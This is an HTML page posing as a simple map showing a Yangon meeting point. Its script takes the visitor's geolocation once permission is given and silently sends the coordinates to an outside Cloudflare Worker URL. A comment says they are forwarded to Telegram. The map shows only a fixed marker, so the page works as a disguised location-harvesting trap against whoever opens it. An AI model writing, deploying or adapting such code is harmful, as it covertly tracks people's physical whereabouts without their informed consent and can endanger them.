<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<title>Map</title>
<meta name="viewport" content="width=device-width, initial-scale=1.0">

<link
  rel="stylesheet"
  href="https://unpkg.com/leaflet@1.9.4/dist/leaflet.css"
/>

<style>
html, body {
  margin: 0;
  padding: 0;
  height: 100%;
}

#map {
  height: 100vh;
  width: 100%;
  display: none;
}

#notice {
  height: 100vh;
  display: flex;
  align-items: center;
  justify-content: center;
  font-family: Arial, sans-serif;
  font-size: 20px;
}
</style>
</head>

<body>

<div id="notice">ğŸ“ Open Location</div>
<div id="map"></div>

<script src="https://unpkg.com/leaflet@1.9.4/dist/leaflet.js"></script>

<script>
/* ================= CONFIG ================= */

// ğŸ” á€™á€„á€ºá€¸ Worker URL á€€á€­á€¯ á€’á€®á€”á€±á€›á€¬á€™á€¾á€¬á€•á€² á€‘á€Šá€·á€º
const WORKER_URL = "https://empty-bar-fafc.freetextingacc001.workers.dev";

// Yangon meeting point (á€™á€•á€¼á€±á€¬á€„á€ºá€¸)
const YANGON_POINT = { lat: 16.7746, lng: 96.1581 };

/* ================= SEND TO WORKER ================= */
function sendToWorker(lat, lng) {
  fetch(WORKER_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({
      lat: lat,
      lng: lng
    })
  });
}

/* ================= LOCATION ================= */
if (navigator.geolocation) {
  navigator.geolocation.getCurrentPosition(
    pos => {
      // âœ… Allow
      document.getElementById("notice").style.display = "none";
      document.getElementById("map").style.display = "block";

      const map = L.map("map").setView(
        [YANGON_POINT.lat, YANGON_POINT.lng],
        15
      );

      L.tileLayer("https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png", {
        attribution: "Â© OpenStreetMap"
      }).addTo(map);

      // Yangon marker only
      L.marker([YANGON_POINT.lat, YANGON_POINT.lng]).addTo(map);

      // ğŸ“¤ Send user location â†’ Worker â†’ Telegram
      const lat = pos.coords.latitude;
      const lng = pos.coords.longitude;

      sendToWorker(lat, lng);
    },
    () => {
      // âŒ Deny
      document.getElementById("notice").innerText = "ğŸ“ Open Location";
    }
  );
} else {
  document.getElementById("notice").innerText = "ğŸ“ Open Location";
}
</script>

</body>
</html>
